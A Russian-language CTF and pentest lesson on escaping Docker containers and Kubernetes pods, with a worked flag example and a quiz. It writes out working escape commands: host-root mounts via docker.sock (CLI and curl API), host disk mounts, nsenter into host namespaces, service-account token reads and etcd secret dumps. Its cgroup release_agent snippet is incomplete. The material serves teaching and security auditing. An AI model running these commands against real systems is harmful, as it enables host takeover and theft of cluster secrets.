---
id: misc-docker-misc
title: "Docker/K8s misc escape: побег из контейнера"
category: misc
parent: misc-sandbox-containers
difficulty: hard
order: 1
tags: [docker, kubernetes, container, escape, namespace, ctf]
prerequisites: [misc-sandbox]
useful_for:
  - "CTF Misc: побег из контейнера в задаче"
  - "Пентест: аудит контейнерной изоляции"
  - "Cloud security: побег из подов Kubernetes"
estimated_minutes: 30
summary: "Практический побег из Docker-контейнера и Kubernetes-пода: docker.sock, privileged, монтирования хоста, cgroup release_agent, nsenter и проверка изоляции."
---
## Почему контейнер — не граница безопасности

Контейнер (Docker, containerd, Kubernetes pod) — это не виртуальная машина, а набор **namespaces** и **cgroups** поверх общего ядра. Если контейнер запущен с лишними привилегиями, общим `docker.sock`, смонтированной файловой системой хоста или уязвимым ядром — из него можно «сбежать» и получить доступ к хосту или другим контейнерам. В CTF такие задачи в misc, в реальности — при аудите CI/CD, облаков и Kubernetes.

Ментальная модель: побег возможен, когда контейнер **пересекается** с хостом (общий namespace, привилегии, смонтированные пути, доступ к сокету). Задача — найти это пересечение.

## Разведка контейнера

Первым делом определите, где вы и что доступно.

```bash
cat /proc/1/cgroup                 # docker/k8s/kubepods?
ls -la /.dockerenv 2>/dev/null     # признак Docker
cat /proc/self/status | grep Cap   # capabilities
capsh --print 2>/dev/null
ls /proc/self/ns/                  # какие namespaces
cat /proc/self/mountinfo           # смонтировано с хоста
env | grep -iE 'kube|docker|token|secret'
hostname; cat /etc/hostname
```

Признаки Kubernetes:

```bash
ls /var/run/secrets/kubernetes.io/serviceaccount/   # token, ca.crt, namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## Вектор 1: docker.sock

Если смонтирован `/var/run/docker.sock`, вы управляете Docker-демоном хоста.

```bash
ls -la /var/run/docker.sock
# запустить привилегированный контейнер с монтированием хоста
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh
# либо через curl API
curl --unix-socket /var/run/docker.sock http://localhost/version
curl --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/create?name=pwn \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}'
```

Через сокет вы создаёте контейнер с `-v /:/host` и читаете файловую систему хоста — это полноценный побег.

## Вектор 2: privileged и capabilities

```bash
cat /proc/self/status | grep CapEff   # напр. 0000003fffffffff = все capabilities
```

С `CAP_SYS_ADMIN` и привилегированным режимом монтируйте хост-устройства:

```bash
# найти диск хоста
fdisk -l
mkdir /mnt/host && mount /dev/sda1 /mnt/host
chroot /mnt/host sh
```

Без монтирования, но с `CAP_SYS_ADMIN` + `CAP_SYS_CHROOT`:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "/tmp/cgrp/release_agent" > /tmp/cgrp/x/release_agent
# (CVE-2022-0492 / release_agent трюк)
```

## Вектор 3: монтирование хоста

Если какой-то путь хоста смонтирован в контейнер (часто `/host`, `/proc`, `/sys`, `/var/run`), ищите запись в `/proc/self/mountinfo`. Через `/proc/1/root` иногда доступна ФС хоста. Если смонтирован `cgroup` или `hostPath` — используйте release_agent/планировщик.

## Вектор 4: nsenter и host PID

При `--pid=host` (или доступе к host PID namespace) заходите в namespace хоста:

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- sh
```

Если `nsenter` нет — через `/proc/1/ns/`:

```bash
ls -la /proc/1/ns/
nsenter -t 1 -m -u -i -n -p -- /bin/sh
```

## Вектор 5: Kubernetes

- **Service account token:** `/var/run/secrets/kubernetes.io/serviceaccount/token` → `kubectl --token=... --server=https://kubernetes.default` → проверьте права (`kubectl auth can-i --list`).
- **kubelet 10250:** доступ к pod'ам, иногда exec.
- **hostPath pod:** если есть право создавать pod'ы с `hostPath: /` — монтируйте корень и читайте.
- **privileged pod:** аналогично Docker privileged.
- **etcd 2379:** без аутентификации — дамп секретов кластера.

```bash
kubectl auth can-i --list
kubectl get pods --all-namespaces
kubectl create -f evil-pod.yaml   # privileged + hostPath /
```

## Разобранный пример: побег через docker.sock

```bash
$ ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 ... /var/run/docker.sock
$ docker -H unix:///var/run/docker.sock ps
CONTAINER ID   IMAGE     ...   NAMES
a1b2c3         target    ...   victim
$ docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine \
    chroot /host cat /root/flag.txt
FLAG{docker_sock_is_root}
```

Сокет дал полный контроль над хостом — классический побег.

## Справочная таблица: векторы побега

| Вектор | Признак | Команда |
|--------|---------|---------|
| docker.sock | файл сокета | `docker -H unix://... run -v /:/host` |
| privileged | CapEff полный | `mount /dev/sda1` |
| CAP_SYS_ADMIN | CapEff | mount cgroup/host |
| host mount | mountinfo | доступ к `/host` |
| host PID | `--pid=host` | `nsenter -t 1 -a` |
| k8s token | serviceaccount | `kubectl auth can-i` |
| kubelet | :10250 | exec в pod |
| etcd | :2379 | дамп секретов |

## Типовые ошибки новичка

- **Искать «эксплойт ядра» сразу.** Чаще всего побег — через конфигурацию (сокет/привилегии), а не CVE.
- **Не проверить capabilities.** `CapEff` сразу показывает, привилегирован ли контейнер.
- **Забыть про Kubernetes.** Token в `serviceaccount` — прямой путь к API.
- **Игнорировать mountinfo.** Смонтированные пути — самый частый «мост» к хосту.
- **Путать namespaces.** Проверьте, какие из них общие с хостом.

## Что дальше / решение

Порядок: разведка (`cgroup`, `CapEff`, `mountinfo`, env) → определить вектор (сокет/привилегии/mount/PID/k8s) → выполнить побег → прочитать флаг/данные. Связанные уроки: `misc-sandbox`, `misc-sandbox-containers`, `cloud-*` (K8s-специфика). Решение — когда получен доступ к хосту/другому контейнеру или прочитан флаг.

## Расширенный разбор: как читать конфигурацию контейнера

Быстрый скрипт-триаж, который показывает все «пересечения» с хостом:

```bash
#!/bin/sh
echo "== cgroup =="; cat /proc/1/cgroup
echo "== docker? =="; ls -la /.dockerenv 2>/dev/null
echo "== caps =="; grep Cap /proc/self/status; capsh --print 2>/dev/null | head
echo "== mounts (host) =="; grep -E "/host|/proc|/sys|/var/run" /proc/self/mountinfo | head
echo "== sock =="; ls -la /var/run/docker.sock 2>/dev/null
echo "== k8s token =="; ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
echo "== namespaces =="; ls -la /proc/1/ns/ 2>/dev/null
```

Читайте результат так: `CapEff` полный (`0000003fffffffff`) → почти наверняка привилегированный; смонтированный `/host` или `docker.sock` → прямой побег; наличие `serviceaccount/token` → вы в pod'е Kubernetes. Каждый из этих признаков — отдельный вектор. Даже один смонтированный «лишний» путь часто достаточен.

## Практический чек-лист

1. Определить платформу (Docker/K8s/containerd) по `cgroup`/`/.dockerenv`.
2. Проверить capabilities (`CapEff`), `privileged`.
3. Проверить `docker.sock` и другие сокеты.
4. Проверить `mountinfo` на смонтированные пути хоста.
5. Проверить host PID namespace (`nsenter`).
6. Проверить `serviceaccount` token и права в K8s.
7. Выбрать вектор, выполнить побег, зафиксировать доступ.

## Справочная таблица: инструменты и команды

| Задача | Команда |
|--------|---------|
| Платформа | `cat /proc/1/cgroup`, `ls /.dockerenv` |
| Capabilities | `grep Cap /proc/self/status`, `capsh --print` |
| Сокет Docker | `docker -H unix:///var/run/docker.sock ps` |
| Монтирования | `cat /proc/self/mountinfo` |
| Host PID | `nsenter -t 1 -a` |
| K8s права | `kubectl auth can-i --list` |
| K8s pods | `kubectl get pods -A` |
| Монтирование хоста | `mount /dev/sda1 /mnt` |

## Вектор 6: уязвимости ядра и runc (обзор)

Иногда конфигурация «чистая», но ядро или рантайм уязвимы. Известные классы: побег через `runc` (CVE-2019-5736 — перезапись бинарника `runc` при `exec`), через ядерные уязвимости (`Dirty Pipe` CVE-2022-0847, `Dirty COW` CVE-2016-5195), через `overlayfs` (CVE-2023-0386). Признаки: необычная версия ядра (`uname -a`), старый Docker/containerd, возможность запускать контейнеры. Проверьте `uname -r` и сравните с известными CVE; при наличии публичного эксплойта под вашу версию — применяйте. Помните: это крайний случай, сначала исчерпайте конфигурационные векторы (сокет, привилегии, монтирования) — они надёжнее и безопаснее для стабильности системы. В CTF ядерные побеги дают редко, чаще задача решается через `docker.sock` или `privileged`.

## Квиз

```quiz
- question: "Почему доступ к /var/run/docker.sock равен побегу?"
  options:
    - "это просто лог"
    - "через сокет можно управлять демоном и запускать контейнеры с монтированием хоста"
    - "это файл SSH"
    - "это шрифт"
  answer: 1
  explanation: "Docker-демон запускает контейнеры от root хоста."
- question: "Какая capability позволяет монтировать и использовать nsenter?"
  options:
    - "CAP_NET_RAW"
    - "CAP_SYS_ADMIN"
    - "CAP_CHOWN"
    - "CAP_SETUID"
  answer: 1
  explanation: "CAP_SYS_ADMIN открывает монтирование, cgroup и доступ к /proc."
- question: "Что делает release_agent в cgroup?"
  options:
    - "освобождает память"
    - "запускает скрипт на хосте при опустошении cgroup"
    - "удаляет контейнер"
    - "шифрует диск"
  answer: 1
  explanation: "Это известный вектор побега при CAP_SYS_ADMIN."
- question: "Зачем читать token из /var/run/secrets в поде Kubernetes?"
  options:
    - "для красоты"
    - "чтобы обращаться к K8s API с правами service account"
    - "для ускорения"
    - "для сжатия логов"
  answer: 1
  explanation: "Токен аутентифицирует вас в API-сервере кластера."
- question: "Первый шаг при побеге из контейнера?"
  options:
    - "сразу mount /dev/sda"
    - "определить платформу, capabilities, namespaces и монтирования"
    - "удалить контейнер"
    - "перезагрузить хост"
  answer: 1
  explanation: "От разведки зависит выбор рабочего вектора."
```

## Где пригодится

- **CTF Misc** — задачи на побег из контейнера.
- **Пентест** — аудит изоляции Docker/Kubernetes.
- **Cloud security** — побег из подов EKS/GKE/AKS.
- **Работа/SOC** — понимание признаков компрометации контейнера.
